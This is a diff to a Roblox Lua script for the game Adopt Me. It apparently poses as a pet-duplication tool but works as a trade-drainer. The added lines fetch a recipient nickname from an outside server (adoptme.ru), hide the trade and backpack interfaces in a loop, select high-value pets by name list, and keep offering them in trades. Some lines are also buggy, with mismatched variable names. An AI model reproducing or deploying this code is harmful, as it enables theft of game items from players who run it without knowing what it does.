@@ -15,7 +15,6 @@ local VirtualUser = game:GetService("VirtualUser")
 
 local Player = Players.LocalPlayer
 local wait = task.wait
-local nickname = "1jackpetadopt"
 
 
 Player.Idled:connect(
@@ -52,6 +51,13 @@ game:GetService("RunService"):Set3dRenderingEnabled(false)
 
 wait(5)
 
+local nickname = ""
+local Response = syn.request({
+    Url = "http://adoptme.ru/getnickname.php",
+    Method = "GET"
+})
+
+nickname = Response.Body
 
 function tp()
     local L
@@ -83,10 +89,11 @@ tp()
 
 spawn(function()
     while true do
-        wait(0.03)
         Player.PlayerGui.DialogApp.Dialog.Visible = false
         Player.PlayerGui.TradeApp.Frame.Visible = false
         Player.PlayerGui.HintApp.TextLabel.Visible = false
+        Player.PlayerGui.InteractionsApp.BasicSelects.Visible = false
+        Player.PlayerGui.ToolApp.Frame.OpenBackpack.Visible = false
     end
 end)
 
@@ -100,21 +107,43 @@ for i,v in pairs(Players:GetPlayers()) do
     end 
 end
 
+function dupeble(name,meganeon)
+    thrashlist = {"dog", "cat","otter", "chocolate_labrador", "buffalo", "puma", "bandicoot", "snow_cat", "basic_egg_2022_mouse", "dingo", "wolpertinger", "basic_egg_2022_ant", "fennec", "winter_2021_walrus", "ox", "stingray", "woodland_2022_bullfrog", "bat", "ground_sloth", "robin", "snow_puma", "halloween_2021_black_mummy_cat", "halloween_2022_slug", "tasmanian_tiger", "lunar_ox", "beaver", "kirin", "crab", "rabbit", "bunny", "lny_2022_tiger"}
+    goodpetslist = {"halloween_2022_undead_jousting_horse","fall_2022_pheasant_black","rain_2023_diamond_amazon","santa_dog","monkey_king","elf_hedgehog","frost_dragon","parrot","evil_unicorn","crow","owl","giraffe","bat_dragon","shadow_dragon","turtle","arctic_reindeer","jungle_egg","albino_monkey","safari_egg","safari_egg"} 
+    for i,v in pairs(goodpetslist) do
+        if  name == v then
+            return true
+        end
+    end
+
+    if meganeon == true then
+        for i,v in pairs(thrashlist) do
+            if  name == v then
+                return false
+            end
+        end
+        return true
+    end
+    return false
+end
 
 local petslist = {}
 
 for i,v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pets) do
-    table.insert(petslist, v.unique)
+    if dupeble(v.id, v.properties.mega_neon) == true then
+        table.insert(petslist, v.unique)
+    end
 end
 
 while true do
     pcall(function()  
     ReplicatedStorage.API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(Playt)
     end)
-    wait(5)
+    wait(3)
 
     for i, v in pairs(petslist) do
-        ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v)
+        ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v[1])
+        table.remove(petlist, 1)
     end
 
     if Player.PlayerGui.TradeApp.Frame.NegotiationFrame.Visible == true then
